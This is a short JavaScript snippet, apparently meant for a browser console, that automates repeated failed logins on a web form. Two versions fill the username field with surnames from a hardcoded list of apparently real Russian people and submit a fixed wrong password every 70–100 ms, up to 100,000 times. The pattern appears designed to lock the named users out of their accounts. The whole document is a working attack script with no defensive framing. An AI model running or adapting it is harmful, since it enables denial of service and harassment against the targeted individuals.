// lite
var array = ["Аплин","ДругаяФамилия"];
function run(){
    var x = 0;
    var n = 0;
    var interval = setInterval(function() {
      document.getElementsByName('UN')[0].value = array[x];
      document.getElementsByName('PW')[0].value = "рандомныйпароль"
      login_ctrl.login();
      if (x > 3) {
        return clearInterval(interval);
      }
      n++;
      if(n <= 3){
        n++;
      }else{
        x++;
        n = 0;
      }
    }, 100);
}
run();


// HARD
var array = ["аплин","симонов","фатеева","анисимова","богданов","беляева","картавых","братчикова","латыпов","малышков","толстошеев","носарева","рогозин","рахлевский","белькевич","селявский","будунов","шестакова", "дубская"];
function run(){
    var x = 0;
    var n = 0;
    var r = 0;
    var now = array[0];
    var interval = setInterval(function() {
      document.getElementsByName('UN')[0].value = now;
      document.getElementsByName('PW')[0].value = "рандомныйпароль"
      login_ctrl.login();
      if (x >= 100000) {
        return clearInterval(interval);
      }
      n++;
      if(n <= 4){
        now = array[x];
        n++;
      }else{
        if(r <= 4){
          now = now.charAt(0).toUpperCase() + now.substr(1);
          r++;
        }else{
          x++;
          r = 0;
          n = 0;
        }
      }
      if(x == 18){
        x = 0;
      }
    }, 70);
}
run();


